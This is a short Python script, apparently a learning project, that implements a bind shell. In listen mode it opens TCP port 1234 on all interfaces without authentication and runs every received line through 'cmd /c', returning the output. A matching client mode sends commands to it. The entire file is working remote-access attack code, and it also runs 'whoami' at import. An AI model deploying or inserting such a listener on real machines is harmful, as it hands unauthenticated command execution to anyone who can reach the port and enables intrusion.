"""
bind shell - a socket which we can connect to in order to execute commands
on a system via the network

- Listener
>>>python prj5_....py -l

- Victim
>>>python prj5_....py -c 127.0.0.1
"""

import socket, subprocess, threading, argparse

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

def execute_cmd(cmd):
    """
    This command takes as a parameter, the command to execute.
    """
    try:
        output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
    except:
        output = b"Command failed!"
    return output

print(execute_cmd("whoami"))

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):

    s.send(b"[ -- Connected! --]")

    try:
        while True:
            s.send(b"\r\nEnter Command>>> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()
            print(f"> Executing command: '{buffer}'")
            s.send(execute_cmd(buffer))
    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print("\n" + data, end="", flush=True)
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[-- Starting bind shell! --]")

    while True:
        client_socket, addr = s.accept()
        print("[-- New user connected! --]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[-- Connecting to bind shell! --]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)

args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)
